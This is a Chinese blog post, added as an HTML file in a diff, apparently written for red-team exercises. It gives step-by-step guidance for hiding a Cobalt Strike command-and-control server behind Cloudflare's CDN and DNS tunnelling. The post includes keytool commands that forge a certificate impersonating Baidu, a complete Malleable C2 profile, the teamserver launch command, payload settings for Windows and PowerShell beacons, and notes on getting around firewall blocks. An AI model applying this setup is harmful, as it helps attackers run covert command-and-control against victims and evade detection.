@@ -1,0 +1,289 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>Cobalt Strike利用CDN隐藏IP | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/1616/cs.png')">
+            </div>
+          
+          <h2 class="post-title">Cobalt Strike利用CDN隐藏IP</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2021-03-22</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/hvv/">
+                    HVV
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/cobaltstrike/">
+                    CobaltStrike
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>  每次HVV时都会用到Cobalt Strike，关键时候怕被反制出来，这里记录一下，备忘。<s><em>重点是对自己IP和流量的隐藏,已经被标记好多个恶意IP了，VPS换IP换不起了</em></s></p>
+<!-- more -->
+<h3 id="0x01-隐藏cobalt-strike特征">0x01 隐藏Cobalt Strike特征</h3>
+<p>最近HVV各种网站对IP进行恶意标记，不说流量，起码IP得隐藏起来。网上教程很多，这里重点记录一下利用CDN的方法。</p>
+<h4 id="1-修改cs默认端口">1. 修改CS默认端口</h4>
+<p>编辑teamserver文件，修改最后一行port参数进行修改。端口50050已经被标记烂了....<br>
+<img src="https://tuchuang.looklook.workers.dev/1616/port.png" alt="port" loading="lazy"></p>
+<h4 id="2-修改证书指纹特征">2. 修改证书指纹特征</h4>
+<p>CS文件夹里面有一个cobaltstrike.store文件，删除它。如果没有利用如下命令生成一个,同时把teamserver文件里也修改成如下命令。</p>
+<pre><code>keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname &quot;CN=baidu.com, OU=service operation department, O=Beijing Baidu Netcom Science Technology Co.\, Ltd, L=Beijing, S=Beijing, C=CN&quot;
+</code></pre>
+<h4 id="4-利用cdn进行ip混淆">4. 利用CDN进行IP混淆</h4>
+<p>CDN需要用到cloudflare的证书，首先申请一个域名，建议在namesilo里挑个便宜的，之后在namesilo的控制台里把Nameserver指向cloudflare的DNS，该操作可能需要一段时间生效。<br>
+<img src="https://tuchuang.looklook.workers.dev/1616/clouddns.png" alt="DNS" loading="lazy"><br>
+然后登录cloudflare，在DNS里添加一条A解析记录，并打开代理开关。<br>
+<img src="https://tuchuang.looklook.workers.dev/1616/A.png" alt="A" loading="lazy"><br>
+之后点击“SSL/TLS”将加密模式改为完全（严格），并点击源服务器创建证书，记得将公钥和私钥保存下来，分别存为server.pem和server.key。利用如下两条命令生成xxx.com.store文件，<strong>记得将xxx.com更换成自己解析的域名地址。</strong></p>
+<pre><code>openssl pkcs12 -export -in server.pem -inkey server.key -out ***.com.p12 -name ***.com -passout pass:123456
+</code></pre>
+<pre><code>keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore ***.com.store -srckeystore ***.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias ***.com
+</code></pre>
+<p>最后新建一个cloudflare.profile文件，文件内容如下。接下来将cloudflare.profile和***.com.store文件一起放到CS文件夹里面。</p>
+<pre><code>https-certificate {
+    set keystore &quot;***.com.store&quot;;
+    set password &quot;123456&quot;;
+}
+http-stager {
+    set uri_x86 &quot;/api/1&quot;;
+    set uri_x64 &quot;/api/2&quot;;
+    client {
+        header &quot;Host&quot; &quot;***.com&quot;;}
+    server {
+        output{
+        print;
+        }
+    }
+        }
+http-get {
+    set uri &quot;/api/3&quot;;
+    client {
+        header &quot;Host&quot; &quot;***.com&quot;;
+        metadata {
+            base64;
+            header &quot;Cookie&quot;;
+        }
+        }
+    server {
+        output{
+        print;
+        }
+    }
+        }
+http-post {
+    set uri &quot;/api/4&quot;;
+    client {
+        header &quot;Host&quot; &quot;***.com&quot;;
+        id {
+            uri-append;
+        }
+        output{
+        print;
+        }
+    }
+    server {
+        output{
+        print;
+        }
+    }
+
+}
+</code></pre>
+<h3 id="0x02-启动cobalt-strike">0x02 启动Cobalt Strike</h3>
+<p>CS服务端需要Java环境，我用的是Ubuntu 20.04，直接apt一键安装</p>
+<blockquote>
+<p>apt-get install openjdk-8-jdk</p>
+</blockquote>
+<p>启动的时候记得加上之前的证书文件，这里说明一下cloudflare官方给出的代理端口,生成payload时<strong>一定要记得选对端口</strong></p>
+<blockquote>
+<p>nohup ./teamserver +IP +Pass cloudflare.profile</p>
+</blockquote>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/1616/cloud-port.png" alt="cloudfare-port" loading="lazy"></figure>
+<h3 id="0x03-生成payload">0x03 生成Payload</h3>
+<p>生成一个Windows的攻击载核，<strong>记得正确填写你解析的域名地址</strong><br>
+<img src="https://tuchuang.looklook.workers.dev/1616/payload.png" alt="payload" loading="lazy"></p>
+<p>运行后，CS可以正确上线，并且显示CDN的外网IP地址<br>
+<img src="https://tuchuang.looklook.workers.dev/1616/dif-ip.png" alt="dif-ip" loading="lazy"><br>
+但是通过端口和抓包信息可以看到受害者电脑明显和一个未知的CDN节点进行通信。<s><em>不知道通过防火墙封禁了该IP后受害者电脑会不会自动寻找新的CDN节点IP进行通信</em></s><br>
+<img src="https://tuchuang.looklook.workers.dev/1616/wireshake.png" alt="wireshake" loading="lazy"><br>
+<strong>--------2021-05-02更新---------</strong><br>
+同一环境下，通过路由器的访问控制封禁了某一个CDN的IP后，受害者电脑会自动寻找新的节点IP和CDN进行数据通信，理论上除非防火墙封禁cloudflare所有的节点IP，不然都可以进行回连。<br>
+<img src="https://tuchuang.looklook.workers.dev/1616/waf.png" alt="waf" loading="lazy"></p>
+<p><strong>--------2021-07-02更新---------</strong><br>
+通过防火墙封禁掉Nslookup解析出来的IP后就无法回连CS了，<s><em>不是说CDN可以套很多个节点的吗？咋只有两个IP地址？</em></s><br>
+<img src="https://tuchuang.looklook.workers.dev/1616/nslookup.png" alt="nslookup" loading="lazy"></p>
+<p><strong>--------2022-02-17更新---------</strong><br>
+查资料了解到免费的Cloudflare账号只分配2个IP，这两个IP是固定不变的。这两个IP相当于只是一个入口IP，不同地区访问通过入口IP进入CF的库寻找合适的CDN节点进行访问，这样导致Cobalt Strike上的外部IP地址一直在变动。<s><em>2个固定IP是官方规定的，后面是我查资料自己的理解</em></s></p>
+<p><strong>最常用的powershell在使用时有几点需要注意，不然无法正确上线CS</strong></p>
+<blockquote>
+<p><strong>1. 注意Local Port需要选择上面官方指定的https端口之一</strong><br>
+<strong>2. 需要勾选Enable SSL选项</strong><br>
+<strong>3. Local Host填写自己解析的域名地址</strong></p>
+</blockquote>
+<p><img src="https://tuchuang.looklook.workers.dev/1616/powershell.png" alt="powershell" loading="lazy"><br>
+可以看到powershell也能顺利上线。<br>
+<img src="https://tuchuang.looklook.workers.dev/1616/powershellip.png" alt="dif-ips" loading="lazy"></p>
+<h4 id="5-利用dns进行ip隐藏">5. 利用DNS进行IP隐藏</h4>
+<p>上面虽然隐藏了VPS的真实IP地址，但是现在护网看见国外IP一律封禁还是很烦的。利用DNS隧道可以绕过一些简单的防火墙和WAF。操作起来也很简单，首先在上面cloudflare的DNS解析里面加两条NS记录，结构如下</p>
+<blockquote>
+<p>A             test         VPSIP<br>
+NS          ns1            test.<em><strong>.com<br>
+NS         nc1           test.</strong></em>.com</p>
+</blockquote>
+<p>之后新建一个基于DNS协议的listeners，上面写上两个NS记录，下面随便写一个就好。<br>
+<img src="https://tuchuang.looklook.workers.dev/1616/DNS.png" alt="DNS" loading="lazy"><br>
+这里注意如果提示Error可能是VPS的端口被占用，我这里用的Ubuntu被一个systemd-resolved服务占用了，这里直接关闭就好</p>
+<blockquote>
+<p>systemctl stop systemd-resolved</p>
+</blockquote>
+<p>DNS木马上线时间比较长，耐心等待，上线后直接checkin，等一会就可以进行操作了。<br>
+<img src="https://tuchuang.looklook.workers.dev/1616/DNS1.png" alt="DNS1" loading="lazy"><br>
+可以看到DNS木马成功上线,在受害者电脑上找不到端口连接信息，抓包分析也都是和DNS服务器在进行通信(这里dns指向了网关)，算是进一步的隐藏了自己的身份。<s><em>其实通过抓包可以看到数据流里面有之前指定的ns记录的域名地址，感觉还是不太隐蔽、至少域名暴露了，以后找到了更好的方法再继续更新</em></s></p>
+<blockquote>
+<p>作者： Mari0er<br>
+链接： https://mari0er.top/post/cobaltstrike.html<br>
+版权： 本博客所有文章除特别声明外，均采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！！</p>
+</blockquote>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/how-to-use-nmap.html/">
+              <h3 class="post-title">
+                下一篇：一张图教你使用Nmap
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
